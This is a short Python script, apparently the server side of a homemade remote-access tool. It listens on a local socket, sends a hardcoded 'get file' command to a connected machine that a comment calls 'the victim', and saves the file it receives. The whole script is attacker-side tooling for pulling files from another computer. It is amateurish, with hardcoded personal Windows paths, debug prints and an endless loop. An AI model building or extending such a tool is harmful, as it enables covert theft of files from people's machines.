import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 9984))

    s.listen(1)
    client_socket, adress = s.accept()
    print("Connection from: " + str(adress))
    command = "get file C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\index.jpg"
    # input('Please enter a command to the victim')
    client_socket.send(command.encode('utf-8'))

    while True:
        if 'get file ' in command:
            print('Get File')
            data = None
            file_path = "C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\a.jpg"  # input("Please enter the path of the file")
            with open(file_path, 'wb')as f:
                print('Open File')
                size = 0
                while True:
                    data = client_socket.recv(1024)
                    size += len(data)
                    print(f'Size is {size} and last amount was {len(data)}')
                    if not data or len(data) < 1024:
                        print('Done getting file')
                        f.write(data)
                        f.flush()
                        f.close()
                        break
                    f.write(data)
                    #f.flush()
            print('yyyyyyyyyyyyyyyyyy')
            command = ''
        else:
            data = client_socket.recv(1024)

    client_socket.close()


if __name__ == '__main__':
    server()
